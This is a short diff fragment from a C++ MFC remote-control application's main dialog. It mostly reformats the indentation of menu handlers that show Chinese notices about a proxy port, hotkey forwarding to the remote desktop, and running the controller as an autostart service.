+        MessageBoxA(CString("请通过") + ip.c_str() + ":" + std::to_string(localPort).c_str() + "访问代理端口!",
+                    "提示", MB_ICONINFORMATION);
 }
 
 
 void CMy2015RemoteDlg::OnHookWin()
 {
-	m_bHookWIN = !m_bHookWIN;
-	MessageBoxA(CString("远程控制时，") + (m_bHookWIN ? "" : "不") + CString("转发系统热键到远程桌面。"),
-		"提示", MB_ICONINFORMATION);
-	THIS_CFG.SetInt("settings", "HookWIN", m_bHookWIN);
-	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-	SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
+    m_bHookWIN = !m_bHookWIN;
+    MessageBoxA(CString("远程控制时，") + (m_bHookWIN ? "" : "不") + CString("转发系统热键到远程桌面。"),
+                "提示", MB_ICONINFORMATION);
+    THIS_CFG.SetInt("settings", "HookWIN", m_bHookWIN);
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    SubMenu->CheckMenuItem(ID_HOOK_WIN, m_bHookWIN ? MF_CHECKED : MF_UNCHECKED);
 }
 
 
 void CMy2015RemoteDlg::OnRunasService()
 {
     m_runNormal = !m_runNormal;
-	MessageBoxA(m_runNormal ? CString("以传统方式启动主控程序，没有守护进程。") : 
-        CString("以“服务+代理”形式启动主控程序，会开机自启及被守护。"),
-		"提示", MB_ICONINFORMATION);
-	THIS_CFG.SetInt("settings", "RunNormal", m_runNormal);
-	CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
-	SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, !m_runNormal ? MF_CHECKED : MF_UNCHECKED);
+    MessageBoxA(m_runNormal ? CString("以传统方式启动主控程序，没有守护进程。") :
+                CString("以“服务+代理”形式启动主控程序，会开机自启及被守护。"),
+                "提示", MB_ICONINFORMATION);
+    THIS_CFG.SetInt("settings", "RunNormal", m_runNormal);
+    CMenu* SubMenu = m_MainMenu.GetSubMenu(2);
+    SubMenu->CheckMenuItem(ID_RUNAS_SERVICE, !m_runNormal ? MF_CHECKED : MF_UNCHECKED);
     BOOL r = m_runNormal ? ServerService_Uninstall() : ServerService_Install();
 }
